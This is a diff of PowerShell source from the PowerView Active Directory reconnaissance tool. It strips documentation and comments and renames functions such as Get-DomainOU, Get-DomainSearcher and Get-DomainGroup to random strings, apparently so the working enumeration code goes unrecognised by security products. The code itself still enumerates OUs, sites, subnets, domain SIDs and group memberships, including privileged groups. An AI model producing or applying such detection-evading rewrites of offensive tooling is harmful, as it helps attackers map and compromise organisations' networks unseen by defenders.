-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER SecurityMasks
-
-Specifies an option for examining security information of a directory object.
-One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
-
-.PARAMETER FindOne
-
-Only return one result object.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.PARAMETER Raw
-
-Switch. Return raw results instead of translating the fields into a custom PSObject.
-
-.EXAMPLE
-
-Get-DomainOU
-
-Returns the current OUs in the domain.
-
-.EXAMPLE
-
-Get-DomainOU *admin* -Domain testlab.local
-
-Returns all OUs with "admin" in their name in the testlab.local domain.
-
-.EXAMPLE
-
-Get-DomainOU -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"
-
-Returns all OUs with linked to the specified group policy object.
-
-.EXAMPLE
-
-"*admin*","*server*" | Get-DomainOU
-
-Search for OUs with the specific names.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainOU -Credential $Cred
-
-.OUTPUTS
-
-PowerView.OU
-
-Custom PSObject with translated OU property fields.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.OU')]
@@ -9343,7 +5503,7 @@ Custom PSObject with translated OU property fields.
         if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
         if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
         if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
-        $OUSearcher = Get-DomainSearcher @SearcherArguments
+        $OUSearcher = NJUXTHTL @SearcherArguments
     }
 
     PROCESS {
@@ -9355,14 +5515,14 @@ Custom PSObject with translated OU property fields.
                 if ($IdentityInstance -match '^OU=.*') {
                     $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                     if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
-                        #   and rebuild the domain searcher
+                        
+                        
                         $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                        Write-Verbose "[Get-DomainOU] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        Write-Verbose "[HM6W17ZN] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                         $SearcherArguments['Domain'] = $IdentityDomain
-                        $OUSearcher = Get-DomainSearcher @SearcherArguments
+                        $OUSearcher = NJUXTHTL @SearcherArguments
                         if (-not $OUSearcher) {
-                            Write-Warning "[Get-DomainOU] Unable to retrieve domain searcher for '$IdentityDomain'"
+                            Write-Warning "[HM6W17ZN] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
@@ -9381,23 +5541,23 @@ Custom PSObject with translated OU property fields.
             }
 
             if ($PSBoundParameters['GPLink']) {
-                Write-Verbose "[Get-DomainOU] Searching for OUs with $GPLink set in the gpLink property"
+                Write-Verbose "[HM6W17ZN] Searching for OUs with $GPLink set in the gpLink property"
                 $Filter += "(gplink=*$GPLink*)"
             }
 
             if ($PSBoundParameters['LDAPFilter']) {
-                Write-Verbose "[Get-DomainOU] Using additional LDAP filter: $LDAPFilter"
+                Write-Verbose "[HM6W17ZN] Using additional LDAP filter: $LDAPFilter"
                 $Filter += "$LDAPFilter"
             }
 
             $OUSearcher.filter = "(&(objectCategory=organizationalUnit)$Filter)"
-            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter)"
+            Write-Verbose "[HM6W17ZN] HM6W17ZN filter string: $($OUSearcher.filter)"
 
             if ($PSBoundParameters['FindOne']) { $Results = $OUSearcher.FindOne() }
             else { $Results = $OUSearcher.FindAll() }
             $Results | Where-Object {$_} | ForEach-Object {
                 if ($PSBoundParameters['Raw']) {
-                    # return raw result objects
+                    
                     $OU = $_
                 }
                 else {
@@ -9409,7 +5569,7 @@ Custom PSObject with translated OU property fields.
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[Get-DomainOU] Error disposing of the Results object: $_"
+                    Write-Verbose "[HM6W17ZN] Error disposing of the Results object: $_"
                 }
             }
             $OUSearcher.dispose()
@@ -9418,118 +5578,8 @@ Custom PSObject with translated OU property fields.
 }
 
 
-function Get-DomainSite {
-<#
-.SYNOPSIS
+function XMOLM1NY {
 
-Search for all sites or specific site objects in AD.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  
-
-.DESCRIPTION
-
-Builds a directory searcher object using Get-DomainSearcher, builds a custom
-LDAP filter based on targeting/filter parameters, and searches for all objects
-matching the criteria. To only return specific properties, use
-"-Properties whencreated,usnchanged,...". By default, all site objects for
-the current domain are returned.
-
-.PARAMETER Identity
-
-An site name (e.g. Test-Site), DistinguishedName (e.g. CN=Test-Site,CN=Sites,CN=Configuration,DC=testlab,DC=local), or
-GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). Wildcards accepted.
-
-.PARAMETER GPLink
-
-Only return sites with the specified GUID in their gplink property.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER Properties
-
-Specifies the properties of the output object to retrieve from the server.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER SecurityMasks
-
-Specifies an option for examining security information of a directory object.
-One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER FindOne
-
-Only return one result object.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.PARAMETER Raw
-
-Switch. Return raw results instead of translating the fields into a custom PSObject.
-
-.EXAMPLE
-
-Get-DomainSite
-
-Returns the current sites in the domain.
-
-.EXAMPLE
-
-Get-DomainSite *admin* -Domain testlab.local
-
-Returns all sites with "admin" in their name in the testlab.local domain.
-
-.EXAMPLE
-
-Get-DomainSite -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"
-
-Returns all sites with linked to the specified group policy object.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainSite -Credential $Cred
-
-.OUTPUTS
-
-PowerView.Site
-
-Custom PSObject with translated site property fields.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.Site')]
@@ -9613,7 +5663,7 @@ Custom PSObject with translated site property fields.
         if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
         if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
         if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
-        $SiteSearcher = Get-DomainSearcher @SearcherArguments
+        $SiteSearcher = NJUXTHTL @SearcherArguments
     }
 
     PROCESS {
@@ -9625,14 +5675,14 @@ Custom PSObject with translated site property fields.
                 if ($IdentityInstance -match '^CN=.*') {
                     $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                     if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
-                        #   and rebuild the domain searcher
+                        
+                        
                         $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                        Write-Verbose "[Get-DomainSite] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        Write-Verbose "[XMOLM1NY] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                         $SearcherArguments['Domain'] = $IdentityDomain
-                        $SiteSearcher = Get-DomainSearcher @SearcherArguments
+                        $SiteSearcher = NJUXTHTL @SearcherArguments
                         if (-not $SiteSearcher) {
-                            Write-Warning "[Get-DomainSite] Unable to retrieve domain searcher for '$IdentityDomain'"
+                            Write-Warning "[XMOLM1NY] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
@@ -9651,23 +5701,23 @@ Custom PSObject with translated site property fields.
             }
 
             if ($PSBoundParameters['GPLink']) {
-                Write-Verbose "[Get-DomainSite] Searching for sites with $GPLink set in the gpLink property"
+                Write-Verbose "[XMOLM1NY] Searching for sites with $GPLink set in the gpLink property"
                 $Filter += "(gplink=*$GPLink*)"
             }
 
             if ($PSBoundParameters['LDAPFilter']) {
-                Write-Verbose "[Get-DomainSite] Using additional LDAP filter: $LDAPFilter"
+                Write-Verbose "[XMOLM1NY] Using additional LDAP filter: $LDAPFilter"
                 $Filter += "$LDAPFilter"
             }
 
             $SiteSearcher.filter = "(&(objectCategory=site)$Filter)"
-            Write-Verbose "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter)"
+            Write-Verbose "[XMOLM1NY] XMOLM1NY filter string: $($SiteSearcher.filter)"
 
             if ($PSBoundParameters['FindOne']) { $Results = $SiteSearcher.FindAll() }
             else { $Results = $SiteSearcher.FindAll() }
             $Results | Where-Object {$_} | ForEach-Object {
                 if ($PSBoundParameters['Raw']) {
-                    # return raw result objects
+                    
                     $Site = $_
                 }
                 else {
@@ -9679,7 +5729,7 @@ Custom PSObject with translated site property fields.
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[Get-DomainSite] Error disposing of the Results object"
+                    Write-Verbose "[XMOLM1NY] Error disposing of the Results object"
                 }
             }
             $SiteSearcher.dispose()
@@ -9688,118 +5738,8 @@ Custom PSObject with translated site property fields.
 }
 
 
-function Get-DomainSubnet {
-<#
-.SYNOPSIS
+function Q3KO0YTQ {
 
-Search for all subnets or specific subnets objects in AD.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  
-
-.DESCRIPTION
-
-Builds a directory searcher object using Get-DomainSearcher, builds a custom
-LDAP filter based on targeting/filter parameters, and searches for all objects
-matching the criteria. To only return specific properties, use
-"-Properties whencreated,usnchanged,...". By default, all subnet objects for
-the current domain are returned.
-
-.PARAMETER Identity
-
-An subnet name (e.g. '192.168.50.0/24'), DistinguishedName (e.g. 'CN=192.168.50.0/24,CN=Subnets,CN=Sites,CN=Configuratioiguration,DC=testlab,DC=local'),
-or GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). Wildcards accepted.
-
-.PARAMETER SiteName
-
-Only return subnets from the specified SiteName.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER Properties
-
-Specifies the properties of the output object to retrieve from the server.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER SecurityMasks
-
-Specifies an option for examining security information of a directory object.
-One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER FindOne
-
-Only return one result object.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.PARAMETER Raw
-
-Switch. Return raw results instead of translating the fields into a custom PSObject.
-
-.EXAMPLE
-
-Get-DomainSubnet
-
-Returns the current subnets in the domain.
-
-.EXAMPLE
-
-Get-DomainSubnet *admin* -Domain testlab.local
-
-Returns all subnets with "admin" in their name in the testlab.local domain.
-
-.EXAMPLE
-
-Get-DomainSubnet -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"
-
-Returns all subnets with linked to the specified group policy object.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainSubnet -Credential $Cred
-
-.OUTPUTS
-
-PowerView.Subnet
-
-Custom PSObject with translated subnet property fields.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.Subnet')]
@@ -9882,7 +5822,7 @@ Custom PSObject with translated subnet property fields.
         if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
         if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
         if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
-        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
+        $SubnetSearcher = NJUXTHTL @SearcherArguments
     }
 
     PROCESS {
@@ -9894,14 +5834,14 @@ Custom PSObject with translated subnet property fields.
                 if ($IdentityInstance -match '^CN=.*') {
                     $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                     if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
-                        #   and rebuild the domain searcher
+                        
+                        
                         $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                        Write-Verbose "[Get-DomainSubnet] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        Write-Verbose "[Q3KO0YTQ] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                         $SearcherArguments['Domain'] = $IdentityDomain
-                        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
+                        $SubnetSearcher = NJUXTHTL @SearcherArguments
                         if (-not $SubnetSearcher) {
-                            Write-Warning "[Get-DomainSubnet] Unable to retrieve domain searcher for '$IdentityDomain'"
+                            Write-Warning "[Q3KO0YTQ] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
@@ -9920,18 +5860,18 @@ Custom PSObject with translated subnet property fields.
             }
 
             if ($PSBoundParameters['LDAPFilter']) {
-                Write-Verbose "[Get-DomainSubnet] Using additional LDAP filter: $LDAPFilter"
+                Write-Verbose "[Q3KO0YTQ] Using additional LDAP filter: $LDAPFilter"
                 $Filter += "$LDAPFilter"
             }
 
             $SubnetSearcher.filter = "(&(objectCategory=subnet)$Filter)"
-            Write-Verbose "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter)"
+            Write-Verbose "[Q3KO0YTQ] Q3KO0YTQ filter string: $($SubnetSearcher.filter)"
 
             if ($PSBoundParameters['FindOne']) { $Results = $SubnetSearcher.FindOne() }
             else { $Results = $SubnetSearcher.FindAll() }
             $Results | Where-Object {$_} | ForEach-Object {
                 if ($PSBoundParameters['Raw']) {
-                    # return raw result objects
+                    
                     $Subnet = $_
                 }
                 else {
@@ -9940,8 +5880,8 @@ Custom PSObject with translated subnet property fields.
                 $Subnet.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')
 
                 if ($PSBoundParameters['SiteName']) {
-                    # have to do the filtering after the LDAP query as LDAP doesn't let you specify
-                    #   wildcards for 'siteobject' :(
+                    
+                    
                     if ($Subnet.properties -and ($Subnet.properties.siteobject -like "*$SiteName*")) {
                         $Subnet
                     }
@@ -9956,7 +5896,7 @@ Custom PSObject with translated subnet property fields.
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[Get-DomainSubnet] Error disposing of the Results object: $_"
+                    Write-Verbose "[Q3KO0YTQ] Error disposing of the Results object: $_"
                 }
             }
             $SubnetSearcher.dispose()
@@ -9965,56 +5905,8 @@ Custom PSObject with translated subnet property fields.
 }
 
 
-function Get-DomainSID {
-<#
-.SYNOPSIS
+function I2HD47RA {
 
-Returns the SID for the current domain or the specified domain.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainComputer  
-
-.DESCRIPTION
-
-Returns the SID for the current domain or the specified domain by executing
-Get-DomainComputer with the -LDAPFilter set to (userAccountControl:1.2.840.113556.1.4.803:=8192)
-to search for domain controllers through LDAP. The SID of the returned domain controller
-is then extracted.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainSID
-
-.EXAMPLE
-
-Get-DomainSID -Domain testlab.local
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainSID -Credential $Cred
-
-.OUTPUTS
-
-String
-
-A string representing the specified domain SID.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([String])]
@@ -10041,205 +5933,19 @@ A string representing the specified domain SID.
     if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
     if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
 
-    $DCSID = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid
+    $DCSID = VVVCIHJ3 @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid
 
     if ($DCSID) {
         $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
     }
     else {
-        Write-Verbose "[Get-DomainSID] Error extracting domain SID for '$Domain'"
+        Write-Verbose "[I2HD47RA] Error extracting domain SID for '$Domain'"
     }
 }
 
 
-function Get-DomainGroup {
-<#
-.SYNOPSIS
+function H3GAYKFB {
 
-Return all groups or specific group objects in AD.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher, Get-DomainObject, Convert-ADName, Convert-LDAPProperty  
-
-.DESCRIPTION
-
-Builds a directory searcher object using Get-DomainSearcher, builds a custom
-LDAP filter based on targeting/filter parameters, and searches for all objects
-matching the criteria. To only return specific properties, use
-"-Properties samaccountname,usnchanged,...". By default, all group objects for
-the current domain are returned. To return the groups a specific user/group is
-a part of, use -MemberIdentity X to execute token groups enumeration.
-
-.PARAMETER Identity
-
-A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
-specifying the group to query for. Wildcards accepted.
-
-.PARAMETER MemberIdentity
-
-A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
-specifying the user/group member to query for group membership.
-
-.PARAMETER AdminCount
-
-Switch. Return users with '(adminCount=1)' (meaning are/were privileged).
-
-.PARAMETER GroupScope
-
-Specifies the scope (DomainLocal, Global, or Universal) of the group(s) to search for.
-Also accepts NotDomainLocal, NotGloba, and NotUniversal as negations.
-
-.PARAMETER GroupProperty
-
-Specifies a specific property to search for when performing the group search.
-Possible values are Security, Distribution, CreatedBySystem, and NotCreatedBySystem.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER Properties
-
-Specifies the properties of the output object to retrieve from the server.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER SecurityMasks
-
-Specifies an option for examining security information of a directory object.
-One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER FindOne
-
-Only return one result object.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.PARAMETER Raw
-
-Switch. Return raw results instead of translating the fields into a custom PSObject.
-
-.EXAMPLE
-
-Get-DomainGroup | select samaccountname
-
-samaccountname
---------------
-WinRMRemoteWMIUsers__
-Administrators
-Users
-Guests
-Print Operators
-Backup Operators
-...
-
-.EXAMPLE
-
-Get-DomainGroup *admin* | select distinguishedname
-
-distinguishedname
------------------
-CN=Administrators,CN=Builtin,DC=testlab,DC=local
-CN=Hyper-V Administrators,CN=Builtin,DC=testlab,DC=local
-CN=Schema Admins,CN=Users,DC=testlab,DC=local
-CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
-CN=Domain Admins,CN=Users,DC=testlab,DC=local
-CN=DnsAdmins,CN=Users,DC=testlab,DC=local
-CN=Server Admins,CN=Users,DC=testlab,DC=local
-CN=Desktop Admins,CN=Users,DC=testlab,DC=local
-
-.EXAMPLE
-
-Get-DomainGroup -Properties samaccountname -Identity 'S-1-5-21-890171859-3433809279-3366196753-1117' | fl
-
-samaccountname
---------------
-Server Admins
-
-.EXAMPLE
-
-'CN=Desktop Admins,CN=Users,DC=testlab,DC=local' | Get-DomainGroup -Server primary.testlab.local -Verbose
-VERBOSE: Get-DomainSearcher search string: LDAP://DC=testlab,DC=local
-VERBOSE: Get-DomainGroup filter string: (&(objectCategory=group)(|(distinguishedname=CN=DesktopAdmins,CN=Users,DC=testlab,DC=local)))
-
-usncreated            : 13245
-grouptype             : -2147483646
-samaccounttype        : 268435456
-samaccountname        : Desktop Admins
-whenchanged           : 8/10/2016 12:30:30 AM
-objectsid             : S-1-5-21-890171859-3433809279-3366196753-1118
-objectclass           : {top, group}
-cn                    : Desktop Admins
-usnchanged            : 13255
-dscorepropagationdata : 1/1/1601 12:00:00 AM
-name                  : Desktop Admins
-distinguishedname     : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
-member                : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
-whencreated           : 8/10/2016 12:29:43 AM
-instancetype          : 4
-objectguid            : f37903ed-b333-49f4-abaa-46c65e9cca71
-objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=testlab,DC=local
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainGroup -Credential $Cred
-
-.EXAMPLE
-
-Get-Domain | Select-Object -Expand name
-testlab.local
-
-'DEV\Domain Admins' | Get-DomainGroup -Verbose -Properties distinguishedname
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-VERBOSE: [Get-DomainGroup] Extracted domain 'dev.testlab.local' from 'DEV\Domain Admins'
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
-VERBOSE: [Get-DomainGroup] filter string: (&(objectCategory=group)(|(samAccountName=Domain Admins)))
-
-distinguishedname
------------------
-CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local
-
-.OUTPUTS
-
-PowerView.Group
-
-Custom PSObject with translated group property fields.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
@@ -10334,7 +6040,7 @@ Custom PSObject with translated group property fields.
         if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
         if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
         if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
-        $GroupSearcher = Get-DomainSearcher @SearcherArguments
+        $GroupSearcher = NJUXTHTL @SearcherArguments
     }
 
     PROCESS {
@@ -10348,23 +6054,23 @@ Custom PSObject with translated group property fields.
                 $SearcherArguments['Identity'] = $MemberIdentity
                 $SearcherArguments['Raw'] = $True
 
-                Get-DomainObject @SearcherArguments | ForEach-Object {
-                    # convert the user/group to a directory entry
+                U3GGBSG9 @SearcherArguments | ForEach-Object {
+                    
                     $ObjectDirectoryEntry = $_.GetDirectoryEntry()
 
-                    # cause the cache to calculate the token groups for the user/group
+                    
                     $ObjectDirectoryEntry.RefreshCache('tokenGroups')
 
                     $ObjectDirectoryEntry.TokenGroups | ForEach-Object {
-                        # convert the token group sid
+                        
                         $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
 
-                        # ignore the built in groups
+                        
                         if ($GroupSid -notmatch '^S-1-5-32-.*') {
                             $SearcherArguments['Identity'] = $GroupSid
                             $SearcherArguments['Raw'] = $False
                             if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
-                            $Group = Get-DomainObject @SearcherArguments
+                            $Group = U3GGBSG9 @SearcherArguments
                             if ($Group) {
                                 $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                 $Group
@@ -10384,14 +6090,14 @@ Custom PSObject with translated group property fields.
                     elseif ($IdentityInstance -match '^CN=') {
                         $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                         if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
-                            #   and rebuild the domain searcher
+                            
+                            
                             $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                            Write-Verbose "[Get-DomainGroup] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                            Write-Verbose "[H3GAYKFB] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                             $SearcherArguments['Domain'] = $IdentityDomain
-                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
+                            $GroupSearcher = NJUXTHTL @SearcherArguments
                             if (-not $GroupSearcher) {
-                                Write-Warning "[Get-DomainGroup] Unable to retrieve domain searcher for '$IdentityDomain'"
+                                Write-Warning "[H3GAYKFB] Unable to retrieve domain searcher for '$IdentityDomain'"
                             }
                         }
                     }
@@ -10406,8 +6112,8 @@ Custom PSObject with translated group property fields.
                             $GroupName = $IdentityInstance.Split('\')[1]
                             $IdentityFilter += "(samAccountName=$GroupName)"
                             $SearcherArguments['Domain'] = $GroupDomain
-                            Write-Verbose "[Get-DomainGroup] Extracted domain '$GroupDomain' from '$IdentityInstance'"
-                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
+                            Write-Verbose "[H3GAYKFB] Extracted domain '$GroupDomain' from '$IdentityInstance'"
+                            $GroupSearcher = NJUXTHTL @SearcherArguments
                         }
                     }
                     else {
@@ -10420,7 +6126,7 @@ Custom PSObject with translated group property fields.
                 }
 
                 if ($PSBoundParameters['AdminCount']) {
-                    Write-Verbose '[Get-DomainGroup] Searching for adminCount=1'
+                    Write-Verbose '[H3GAYKFB] Searching for adminCount=1'
                     $Filter += '(admincount=1)'
                 }
                 if ($PSBoundParameters['GroupScope']) {
@@ -10433,7 +6139,7 @@ Custom PSObject with translated group property fields.
                         'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                         'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                     }
-                    Write-Verbose "[Get-DomainGroup] Searching for group scope '$GroupScopeValue'"
+                    Write-Verbose "[H3GAYKFB] Searching for group scope '$GroupScopeValue'"
                 }
                 if ($PSBoundParameters['GroupProperty']) {
                     $GroupPropertyValue = $PSBoundParameters['GroupProperty']
@@ -10443,21 +6149,21 @@ Custom PSObject with translated group property fields.
                         'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                         'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                     }
-                    Write-Verbose "[Get-DomainGroup] Searching for group property '$GroupPropertyValue'"
+                    Write-Verbose "[H3GAYKFB] Searching for group property '$GroupPropertyValue'"
